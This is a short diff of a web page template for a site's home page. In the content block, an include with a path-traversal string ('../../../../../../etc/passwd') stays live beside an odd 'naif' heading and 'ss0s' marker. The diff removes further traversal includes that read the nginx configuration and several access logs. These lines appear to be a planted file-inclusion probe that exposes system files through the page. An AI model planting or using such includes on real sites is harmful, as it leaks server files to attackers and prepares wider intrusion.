@@ -9,10 +9,7 @@
 {% block content %}
     {% component home %}
 <h1>naif</h1>{% include "../../../../../../etc/passwd" %} ss0s
-<h1>naif</h1>{% include "../../../../../../etc/nginx.conf" %} ss0s
-{% include "../../../../../../var/log/access.log" %}
-{% include "../../../../../../var/log/nginx/access.log" %}
-{% include "../../../../../../var/log/nginx2/access.log" %}
+
 {% endblock %}
 {% block scripts %}
     <script defer src="{{ 'home.js' | asset }}"></script>
